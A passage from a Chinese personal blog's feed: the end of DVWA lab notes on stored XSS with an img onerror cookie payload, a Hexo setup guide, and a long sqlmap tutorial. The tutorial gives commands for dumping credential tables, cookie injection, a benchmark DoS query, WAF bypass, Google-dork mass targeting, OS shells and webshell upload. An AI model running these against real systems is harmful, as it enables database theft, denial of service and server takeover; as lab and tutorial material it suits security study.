) ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $name ); $name = mysql_real_escape_string( $name ); // Update database $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); //mysql_close(); } ?&gt;</code></pre><p>$name = preg_replace( ‘/&lt;(.<em>)s(.</em>)c(.<em>)r(.</em>)i(.<em>)p(.</em>)t/i’, ‘’, $name );<br>绕过思路：HTML页面修改Name的最大输入长度，注入Name，注入换一种标签，这里用img<br><img src="1" onerror="alert(document.cookie)"></p><p>Impossible</p><pre><code>&lt;?php if( isset( $_POST[ &#39;btnSign&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Get input $message = trim( $_POST[ &#39;mtxMessage&#39; ] ); $name= trim( $_POST[ &#39;txtName&#39; ] ); // Sanitize message input $message = stripslashes( $message ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = stripslashes( $name ); $name = mysql_real_escape_string( $name ); $name = htmlspecialchars( $name ); // Update database $data = $db-&gt;prepare( &#39;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#39; ); $data-&gt;bindParam( &#39;:message&#39;, $message, PDO::PARAM_STR ); $data-&gt;bindParam( &#39;:name&#39;, $name, PDO::PARAM_STR ); $data-&gt;execute(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt;</code></pre><p>使用htmlspecialchars函数，解决了XSS</p></、>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DVWA笔记&quot;&gt;&lt;a href=&quot;#DVWA笔记&quot; class=&quot;headerlink&quot; title=&quot;DVWA笔记&quot;&gt;&lt;/a&gt;DVWA笔记&lt;/h1&gt;&lt;h3 id=&quot;一：搭建平台&quot;&gt;&lt;a href=&quot;#一：搭建平台&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="信安" scheme="http://0xmj.club/categories/%E4%BF%A1%E5%AE%89/"/>
    
    
      <category term="Dvwa" scheme="http://0xmj.club/tags/Dvwa/"/>
    
  </entry>
  
  <entry>
    <title>hexo博客搭建</title>
    <link href="http://0xmj.club/2017/11/22/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <id>http://0xmj.club/2017/11/22/hexo博客搭建/</id>
    <published>2017-11-22T08:57:45.000Z</published>
    <updated>2017-11-22T09:19:35.191Z</updated>
    
    <content type="html"><![CDATA[<p>#hexo博客搭建</p><p>##安装git,nodejs,npm，并了解相关基础知识<br>下载nodejs和git(<a href="https://git-scm.com/)并安装" target="_blank" rel="external">https://git-scm.com/)并安装</a></p><p>确认安装成功</p><h2 id="建立github仓库"><a href="#建立github仓库" class="headerlink" title="建立github仓库"></a>建立github仓库</h2><p>新建一个名为你的用户名.github.io的仓库，比如说，如果你的github用户名是test，那么你就新建test.github.io的仓库（必须是你的用户名，其它名称无效），将来你的网站访问地址就是 <a href="http://test.github.io" target="_blank" rel="external">http://test.github.io</a> 了，是不是很方便？</p><p>由此可见，每一个github账户最多只能创建一个这样可以直接使用域名访问的仓库。</p><p>几个注意的地方：</p><blockquote><p>注册的邮箱一定要验证，否则不会成功；<br>仓库名字必须是：username.github.io，其中username是你的用户名；<br>仓库创建成功不会立即生效，需要过一段时间，大概10-30分钟，或者更久，我的等了半个小时才生效；<br>创建成功后，默认会在你这个仓库里生成一些示例页面，以后你的网站所有代码都是放在这个仓库里啦。</p></blockquote><h2 id="本地安装Git"><a href="#本地安装Git" class="headerlink" title="本地安装Git"></a>本地安装Git</h2><p>进入 Git 官网，下载相应的 Git 版本，下载完成之后按照引导安装 Git 。安装完成之后在开始菜单中会有一个 Git Bash 。这是一个类似于Liunx的终端，在里面可以模拟Linux下的终端进行操作。</p><h2 id="配置SSH"><a href="#配置SSH" class="headerlink" title="配置SSH"></a>配置SSH</h2><p>打开 Git Bash ，执行下面的命令生成 SSH 访问私钥及公钥。</p><p>$ ssh-keygen -t rsa -C “email@email.com”<br>ssh | 300*0<br>输入命令回车之后会提示你输入一些东西，不用管。一直回车到底就好了。然后你的 ~/.ssh 文件下就会生成两个文件 id_rsa 和 id_rsa.pub 。</p><p>打开你的 Github -&gt; setting -&gt; SSH Keys 。然后点击 New SSH Key 创建一个新的SSH Key。Title 可以用你的计算机名，可以用以区分。将文件 id_rsa.pub 中的所以内容复制粘贴到 Key 下面。然后使用下面的命令测试是否可以连接上 Github 。</p><p>$ ssh -T git@github.com<br><img src="http://oy0tigw51.bkt.clouddn.com/201711210154_534.png" alt=""></p><h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>Hexo的安装在其官方文档中有很详细的说明。下面将简单介绍Hexo的安装。</p><h4 id="安装前提"><a href="#安装前提" class="headerlink" title="安装前提"></a>安装前提</h4><p>安装 Node.js ，请进入Node.js 的官网下载安装。<br>安装 Git ，前面已经说明，不再赘述。</p><h4 id="安装Hexo-1"><a href="#安装Hexo-1" class="headerlink" title="安装Hexo"></a>安装Hexo</h4><p>上面两个工具安装完整之后，打开 Git Bash ，只需要使用npm即可完成Hexo的安装。</p><p>$ npm install -g hexo-cli<br>安装Hexo完成之后，执行下面的命令，Hexo将会在你制定的文件夹中新建所需要的文件。</p><p>$ hexo init <folder><br>$ cd <folder><br>$ npm install<br>新建完成后，文件夹下的目录如下：</folder></folder></p><p>.<br>├── _config.yml<br>├── package.json<br>├── scaffolds<br>├── source<br>|   ├── _drafts<br>|   └── _posts<br>└── themes<br>_config.yml 文件是网站的配置文件，可以在其中配置网站的大部分参数。<br>package.json 文件是应用程序的信息。<br>source 是资源文件夹，是用来存放用户资源的地方。<br>themes 是主题文件夹，Hexo会根据主题来生成不同的静态页面。<br>scaffolds是模板件夹，当新建文章的时候，Hexo会根据模板来建立文件。</p><h2 id="修改主题"><a href="#修改主题" class="headerlink" title="修改主题"></a>修改主题</h2><p><a href="https://github.com/yelog/hexo-theme-3-hexo首先下载这个主题：" target="_blank" rel="external">https://github.com/yelog/hexo-theme-3-hexo首先下载这个主题：</a></p><pre><code>$ cd /f/Workspaces/hexo/$ git clone https://github.com/yelog/hexo-theme-3-hexo themes/3-hexo</code></pre><p>修改_config.yml中的theme: landscape改为theme: 3-hexo，然后重新执行hexo g来重新生成。</p><p>如果出现一些莫名其妙的问题，可以先执行hexo clean来清理一下public的内容，然后再来重新生成和发布。</p><h2 id="上传之前"><a href="#上传之前" class="headerlink" title="上传之前"></a>上传之前</h2><p>在上传代码到github之前，一定要记得先把你以前所有代码下载下来（虽然github有版本管理，但备份一下总是好的），因为从hexo提交代码时会把你以前的所有代码都删掉。</p><h2 id="上传到github"><a href="#上传到github" class="headerlink" title="上传到github"></a>上传到github</h2><p>如果你一切都配置好了，发布上传很容易，一句hexo d就搞定，当然关键还是你要把所有东西配置好。</p><p>首先，ssh key肯定要配置好。</p><p>其次，配置_config.yml中有关deploy的部分：</p><p>正确写法：</p><p>deploy:<br>  type: git<br>  repository: git@github.com:liuxianan/liuxianan.github.io.git<br>  branch: master</p><p>错误写法：</p><p>deploy:<br>  type: github<br>  repository: <a href="https://github.com/liuxianan/liuxianan.github.io.git" target="_blank" rel="external">https://github.com/liuxianan/liuxianan.github.io.git</a><br>  branch: master</p><h2 id="总结：部署步骤"><a href="#总结：部署步骤" class="headerlink" title="总结：部署步骤"></a>总结：部署步骤</h2><p>每次部署的步骤，可按以下三步来进行。</p><p>hexo clean<br>hexo generate<br>hexo deploy</p><ol><li><p>总结：本地调试</p></li><li><p>在执行下面的命令后，</p></li></ol><p>$ hexo g #生成<br>$ hexo s #启动本地服务，进行文章预览调试<br>浏览器输入<a href="http://localhost:4000，查看搭建效果。此后的每次变更_config.yml" target="_blank" rel="external">http://localhost:4000，查看搭建效果。此后的每次变更_config.yml</a> 文件或者新建文件都可以先用此命令调试，尤其是当你想调试新添加的主题时。</p><ol><li>可以用简化的一条命令</li></ol><p>hexo s -g</p><h2 id="常用hexo命令"><a href="#常用hexo命令" class="headerlink" title="常用hexo命令"></a>常用hexo命令</h2><p>hexo clean 清除<br>hexo s -g #生成并本地预览<br>hexo d -g #生成并上传<br>hexo server –debug  # 本地部署<br>hexo generate or hexo g  # 生成页面<br>hexo deployer or hexo d  # 部署到github<br>hexo new “title”  # 新建文章<br>hexo new page “about”  # 创建新页面</p><h2 id="3-Hexo主题的分类和标签设置："><a href="#3-Hexo主题的分类和标签设置：" class="headerlink" title="3-Hexo主题的分类和标签设置："></a>3-Hexo主题的分类和标签设置：</h2><p>这里遇到了坑<br>发了邮件问了这个主题的开发者<br>我以为是要用next主题形式创建hexo new page “ca”</p><pre><code>代码：tags: - 前端- hexocategories: - 前端在博客根目录输入hexo new page tags打开 tags/index.md ，并改成：title: 标签date: 日期type: &quot;tags&quot;comments: false分类同理hexo new page categories打开category/index.md，改为：title: 分类date: 日期type: &quot;categories&quot;comments: false</code></pre><p>实际上不需要 ，大概浪费了我两天时间的坑。<br>这个侧边栏分类无须单独配置，只要在文章中加入 categories</p><p>比如创建了一篇文章如下，加入 categories: 大前端， 这样就会在侧边栏自动出现 大前端 这个分类，且所有有 categories: 大前端 这个参数的文章都会归到这个分类下。<br>这个主题贼强 自动添加文集分类</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201711221651_585.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201711221651_329.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#hexo博客搭建&lt;/p&gt;
&lt;p&gt;##安装git,nodejs,npm，并了解相关基础知识&lt;br&gt;下载nodejs和git(&lt;a href=&quot;https://git-scm.com/)并安装&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://g
      
    
    </summary>
    
      <category term="博客" scheme="http://0xmj.club/categories/%E5%8D%9A%E5%AE%A2/"/>
    
    
      <category term="hexo" scheme="http://0xmj.club/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>SQLMAP注入教程-11种常见SQLMAP使用方法详解</title>
    <link href="http://0xmj.club/2017/11/21/SQLMAP%E6%B3%A8%E5%85%A5%E6%95%99%E7%A8%8B-11%E7%A7%8D%E5%B8%B8%E8%A7%81SQLMAP%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/"/>
    <id>http://0xmj.club/2017/11/21/SQLMAP注入教程-11种常见SQLMAP使用方法详解/</id>
    <published>2017-11-20T20:27:10.000Z</published>
    <updated>2018-04-02T07:32:17.458Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQLMAP注入教程-11种常见SQLMAP使用方法详解"><a href="#SQLMAP注入教程-11种常见SQLMAP使用方法详解" class="headerlink" title="SQLMAP注入教程-11种常见SQLMAP使用方法详解"></a>SQLMAP注入教程-11种常见SQLMAP使用方法详解</h1><pre><code>sqlmap也是渗透中常用的一个注入工具，其实在注入工具方面，一个sqlmap就足够用了，只要你用的熟，秒杀各种工具，只是一个便捷性问题，sql注入另一方面就是手工党了，这个就另当别论了。今天把我一直以来整理的sqlmap笔记发布上来供大家参考。</code></pre><p>一共有11种常见SQLmap使用方法：</p><p>一、SQLMAP用于Access数据库注入</p><p>(1) 猜解是否能注入<br>win: python sqlmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“<br>Linux : .lmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“</p><p>(2) 猜解表<br>win: python sqlmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“ –tables<br>Linux: .lmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“ –tables</p><p>(3) 根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)<br>win: python sqlmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“ –columns -T admin<br>Linux: .lmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“ –columns -T admin</p><p>(4) 根据字段猜解内容(假如通过3得到字段为username和password)<br>win: python sqlmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“ –dump -T admin -C “username,password”<br>Linux: .lmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“ –dump -T admin -C<br>“username,[url=]B[/url]password”</p><p>二、SQLMAP用于Cookie注入</p><p>(1) cookie注入，猜解表<br>win : python sqlmap.py -u “<a href="http://www.xxx.org/jsj/shownews.asp" target="_blank" rel="external">http://www.xxx.org/jsj/shownews.asp</a>“ –cookie “id=31” –table –level 2</p><p>(2) 猜解字段，(通过1的表猜解字段，假如表为admin)<br>win :python sqlmap.py -u “<a href="http://www.xxx.org/jsj/shownews.asp" target="_blank" rel="external">http://www.xxx.org/jsj/shownews.asp</a>“ –cookie “id=31” –columns -T<br>admin –level 2</p><p>(3) 猜解内容<br>win :python sqlmap.py -u “<a href="http://www.xxx.org/jsj/shownews.asp" target="_blank" rel="external">http://www.xxx.org/jsj/shownews.asp</a>“ –cookie “id=31” –dump -T<br>admin -C “username,password” –level 2</p><p>三、SQLMAP用于mysql中DDOS攻击(1) 获取一个Shell</p><p>win:<br>python sqlmap.py -u [url]<a href="http://192.168.159.1/news.php?id=1[/url" target="_blank" rel="external">http://192.168.159.1/news.php?id=1[/url</a>] –sql-shell<br>Linux:<br>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url" target="_blank" rel="external">http://192.168.159.1/news.php?id=1[/url</a>] –sql-shell</p><p>(2) 输入执行语句完成DDOS攻击<br>select benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f)</p><h2 id="四、SQLMAP用于mysql注入"><a href="#四、SQLMAP用于mysql注入" class="headerlink" title="四、SQLMAP用于mysql注入"></a>四、SQLMAP用于mysql注入</h2><p>(1) 查找数据库<br>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321" target="_blank" rel="external">http://www.xxx.com/link.php?id=321</a>“ –dbs</p><p>(2) 通过第一步的数据库查找表(假如数据库名为dataname)<br>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321" target="_blank" rel="external">http://www.xxx.com/link.php?id=321</a>“ -D dataname –tables</p><p>(3) 通过2中的表得出列名(假如表为table_name)<br>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321" target="_blank" rel="external">http://www.xxx.com/link.php?id=321</a>“ -D dataname -T table_name –columns</p><p>(4) 获取字段的值(假如扫描出id,user,password字段)<br>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321" target="_blank" rel="external">http://www.xxx.com/link.php?id=321</a>“ -D dataname -T table_name -C<br>“id,user,password” –dump</p><h3 id="五、SQLMAP中post登陆框注入"><a href="#五、SQLMAP中post登陆框注入" class="headerlink" title="五、SQLMAP中post登陆框注入"></a>五、SQLMAP中post登陆框注入</h3><p>(1) 其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件</p><pre><code>我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。</code></pre><ol><li>浏览器打开目标地址http:// www.xxx.com /Login.asp</li></ol><ol><li>配置burp代理(127.0.0.1:8080)以拦截请求</li></ol><ol><li>点击login表单的submit按钮</li></ol><ol><li>这时候Burp会拦截到了我们的登录POST请求</li></ol><ol><li>把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下</li></ol><ol><li>运行sqlmap并使用如下命令：<br>./sqlmap.py -r search-test.txt -p tfUPass</li></ol><p>这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。<br>注入点：<a href="http://testasp.vulnweb.com/Login.asp" target="_blank" rel="external">http://testasp.vulnweb.com/Login.asp</a></p><p>几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass</p><p>(2) 自动的搜索<br>sqlmap -u [url]<a href="http://testasp.vulnweb.com/Login.asp[/url" target="_blank" rel="external">http://testasp.vulnweb.com/Login.asp[/url</a>] –forms</p><p>(3) 指定参数搜索<br>sqlmap -u [url]<a href="http://testasp.vulnweb.com/Login.asp[/url" target="_blank" rel="external">http://testasp.vulnweb.com/Login.asp[/url</a>] –data “tfUName=321&amp;tfUPass=321”</p><p>六、SQLMAP中Google搜索注入</p><p>inurl后面的语言是由自己定的</p><p>注入过程中如果选y是注入，如果不是选n</p><p>sqlmap -g inurl:php?id=</p><p>七、SQLMAP中的请求延迟</p><p>参数 –delay –safe-freq</p><p>python sqlmap.py –dbs -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://xxx.cn/index.php/Index/view/id/40.html</a>“ –delay 1<br>python sqlmap.py –dbs -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://xxx.cn/index.php/Index/view/id/40.html</a>“ –safe-freq 3</p><p>参数</p><p>八、SQLMAP绕过WAF防火墙<br>注入点:<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="external">http://192.168.159.1/news.php?id=1</a><br>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url" target="_blank" rel="external">http://192.168.159.1/news.php?id=1[/url</a>] -v 3 –dbs –batch –tamper “space2morehash.py”</p><p>space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py</p><p>都是编码方式</p><p>space2hash.py base64encode.py charencode.py</p><p>九、SQLMAP查看权限<br>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url" target="_blank" rel="external">http://192.168.159.1/news.php?id=1[/url</a>] –privileges</p><p>十、SQLMAP伪静态注入<br>(1) 查找数据库<br>python sqlmap.py -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://xxx.cn/index.php/Index/view/id/40.html</a>“ –dbs</p><p>(2) 通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)<br>python sqlmap.py -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://xxx.cn/index.php/Index/view/id/40.html</a>“ -D dataname –tables</p><p>(3) 通过2中的数据表得到字段(假如得到的是tablename表)<br>python sqlmap.py -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://xxx.cn/index.php/Index/view/id/40.html</a>“ -D dataname -T<br>tablename –columns</p><p>(4) 通过3得到字段值(假如从3中得到字段id，password)<br>python sqlmap.py -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://xxx.cn/index.php/Index/view/id/40.html</a>“ -D dataname -T<br>tablename -C “password” –dump</p><p>十一、SQLMAP注入点执行命令与交互写shell<br>(1) 注入点：<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="external">http://192.168.159.1/news.php?id=1</a></p><p>此处采用的是Linux系统<br>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url" target="_blank" rel="external">http://192.168.159.1/news.php?id=1[/url</a>] –os-cmd=ipconfig</p><p>出现语言的选择根据实际的测试网站选择语言</p><p>指定目标站点D:/www/ </p><p>(2) 获取Shell<br>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url" target="_blank" rel="external">http://192.168.159.1/news.php?id=1[/url</a>] –os-shell</p><p>指定目标站点D:/www/</p><p>输入ipconfig/all</p><p>创建用户和删除用户</p><p>只要权限足够大，你可以输入使用任何命令。</p><p>其他命令参考下面：</p><p>从数据库中搜索字段</p><p>1</p><p>sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password</p><p>在dedecms数据库中搜索字段admin或者password。</p><p>读取与写入文件</p><p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p><p>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）</p><p>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</p><p>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</p><p>#示例：</p><p>1</p><p>sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”</p><p>使用shell命令：</p><p>1</p><p>sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell</p><p>接下来指定网站可写目录：</p><p>“E:\php\htdocs\dvwa”</p><p>注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</p><p>sqlmap详细命令：</p><pre><code>-is-dba 当前用户权限（是否为root权限）-dbs 所有数据库-current-db 网站当前数据库-users 所有数据库用户-current-user 当前数据库用户-random-agent 构造随机user-agent-passwords 数据库密码-proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理-time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</code></pre><p>Options（选项）：</p><pre><code>-version 显示程序的版本号并退出-h, –help 显示此帮助消息并退出-v VERBOSE 详细级别：0-6（默认为1）</code></pre><p>Target（目标）：</p><p>以下至少需要设置其中一个选项，设置目标URL。</p><pre><code>-d DIRECT 直接连接到数据库。-u URL, –url=URL 目标URL。-l LIST 从Burp或WebScarab代理的日志中解析目标。-r REQUESTFILE 从一个文件中载入HTTP请求。-g GOOGLEDORK 处理Google dork的结果作为目标URL。-c CONFIGFILE 从INI配置文件中加载选项。</code></pre><p>Request（请求）：</p><p>这些选项可以用来指定如何连接到目标URL。</p><pre><code>-data=DATA 通过POST发送的数据字符串-cookie=COOKIE HTTP Cookie头-cookie-urlencode URL 编码生成的cookie注入-drop-set-cookie 忽略响应的Set – Cookie头信息-user-agent=AGENT 指定 HTTP User – Agent头-random-agent 使用随机选定的HTTP User – Agent头-referer=REFERER 指定 HTTP Referer头-headers=HEADERS 换行分开，加入其他的HTTP头-auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)-auth-cred=ACRED HTTP身份验证凭据（用户名:密码）-auth-cert=ACERT HTTP认证证书（key_file，cert_file）-proxy=PROXY 使用HTTP代理连接到目标URL-proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）-ignore-proxy 忽略系统默认的HTTP代理-delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒-timeout=TIMEOUT 等待连接超时的时间（默认为30秒）-retries=RETRIES 连接超时后重新连接的时间（默认3）-scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式-safe-url=SAFURL 在测试过程中经常访问的url地址-safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL</code></pre><p>Enumeration（枚举）：</p><p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。</p><pre><code>-b, –banner 检索数据库管理系统的标识-current-user 检索数据库管理系统当前用户-current-db 检索数据库管理系统当前数据库-is-dba 检测DBMS当前用户是否DBA-users 枚举数据库管理系统用户-passwords 枚举数据库管理系统用户密码哈希-privileges 枚举数据库管理系统用户的权限-roles 枚举数据库管理系统用户的角色-dbs 枚举数据库管理系统数据库-D DBname 要进行枚举的指定数据库名-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）-tables 枚举的DBMS数据库中的表-columns 枚举DBMS数据库表列-dump 转储数据库管理系统的数据库中的表项-dump-all 转储所有的DBMS数据库表中的条目-search 搜索列（S），表（S）和/或数据库名称（S）-C COL 要进行枚举的数据库列-U USER 用来进行枚举的数据库用户-exclude-sysdbs 枚举表时排除系统数据库-start=LIMITSTART 第一个查询输出进入检索-stop=LIMITSTOP 最后查询的输出进入检索-first=FIRSTCHAR 第一个查询输出字的字符检索-last=LASTCHAR 最后查询的输出字字符检索-sql-query=QUERY 要执行的SQL语句-sql-shell 提示交互式SQL的shell</code></pre><p>Optimization（优化）：</p><p>这些选项可用于优化SqlMap的性能。</p><pre><code>-o 开启所有优化开关–predict-output 预测常见的查询输出–keep-alive 使用持久的HTTP（S）连接–null-connection 从没有实际的HTTP响应体中检索页面长度–threads=THREADS 最大的HTTP（S）请求并发量（默认为1）</code></pre><p>Injection（注入）：</p><p>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</p><pre><code>-p TESTPARAMETER 可测试的参数（S）–dbms=DBMS 强制后端的DBMS为此值–os=OS 强制后端的DBMS操作系统为这个值–prefix=PREFIX 注入payload字符串前缀–suffix=SUFFIX 注入payload字符串后缀–tamper=TAMPER 使用给定的脚本（S）篡改注入数据</code></pre><p>Detection（检测）：</p><p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</p><pre><code>–level=LEVEL 执行测试的等级（1-5，默认为1）–risk=RISK 执行测试的风险（0-3，默认为1）–string=STRING 查询时有效时在页面匹配字符串–regexp=REGEXP 查询时有效时在页面匹配正则表达式–text-only 仅基于在文本内容比较网页</code></pre><p>Techniques（技巧）：</p><p>这些选项可用于调整具体的SQL注入测试。</p><pre><code>–technique=TECH SQL注入技术测试（默认BEUST）–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）–union-cols=UCOLS 定列范围用于测试UNION查询注入–union-char=UCHAR 用于暴力猜解列数的字符</code></pre><p>Fingerprint（指纹）：</p><pre><code>-f, –fingerprint 执行检查广泛的DBMS版本指纹</code></pre><p>Brute force（蛮力）：</p><p>这些选项可以被用来运行蛮力检查。</p><pre><code>–common-tables 检查存在共同表–common-columns 检查存在共同列</code></pre><p>User-defined function injection（用户自定义函数注入）：</p><p>这些选项可以用来创建用户自定义函数。</p><p>–udf-inject 注入用户自定义函数</p><p>–shared-lib=SHLIB 共享库的本地路径</p><p>File system access（访问文件系统）：</p><p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p><pre><code>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</code></pre><p>Operating system access（操作系统访问）：</p><p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p><pre><code>–os-cmd=OSCMD 执行操作系统命令–os-shell 交互式的操作系统的shell–os-pwn 获取一个OOB shell，meterpreter或VNC–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC–os-bof 存储过程缓冲区溢出利用–priv-esc 数据库进程用户权限提升–msf-path=MSFPATH Metasploit Framework本地的安装路径–tmp-path=TMPPATH 远程临时文件目录的绝对路径</code></pre><p>Windows注册表访问：</p><p>这些选项可以被用来访问后端数据库管理系统Windows注册表。</p><pre><code>–reg-read 读一个Windows注册表项值–reg-add 写一个Windows注册表项值数据–reg-del 删除Windows注册表键值–reg-key=REGKEY Windows注册表键–reg-value=REGVAL Windows注册表项值–reg-data=REGDATA Windows注册表键值数据–reg-type=REGTYPE Windows注册表项值类型这些选项可以用来设置一些一般的工作参数。-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中-s SESSIONFILE 保存和恢复检索会话文件的所有数据–flush-session 刷新当前目标的会话文件–fresh-queries 忽略在会话文件中存储的查询结果–eta 显示每个输出的预计到达时间–update 更新SqlMap–save file保存选项到INI配置文件–batch 从不询问用户输入，使用所有默认配置。</code></pre><p>Miscellaneous（杂项）：</p><pre><code>–beep 发现SQL注入时提醒–check-payload IDS对注入payloads的检测测试–cleanup SqlMap具体的UDF和表清理DBMS–forms 对目标URL的解析和测试形式–gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果–page-rank Google dork结果显示网页排名（PR）–parse-errors 从响应页面解析数据库管理系统的错误消息–replicate 复制转储的数据到一个sqlite3数据库–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址–wizard 给初级用户的简单向导界面</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQLMAP注入教程-11种常见SQLMAP使用方法详解&quot;&gt;&lt;a href=&quot;#SQLMAP注入教程-11种常见SQLMAP使用方法详解&quot; class=&quot;headerlink&quot; title=&quot;SQLMAP注入教程-11种常见SQLMAP使用方法详解&quot;&gt;&lt;/a&gt;SQ
      
    
    </summary>
    
      <category term="信安" scheme="http://0xmj.club/categories/%E4%BF%A1%E5%AE%89/"/>
    
    
      <category term="sqlmap" scheme="http://0xmj.club/tags/sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>my-first-blog</title>
    <link href="http://0xmj.club/2017/09/27/Hello%20World%20/"/>
    <id>http://0xmj.club/2017/09/27/Hello World /</id>
    <published>2017-09-27T08:56:58.000Z</published>
    <updated>2017-11-22T09:01:34.087Z</updated>
    
    <content type="html"><![CDATA[<p>description:<br>和以往一样，一个博客的开篇都有这么一个开始，几乎所到之处都有一个相似的开始，他的名字叫做Hello World。当然这里也一样，也是从hello world开始的。你好，世界！</p><hr>]]></content>
    
    <summary type="html">
    
      
      
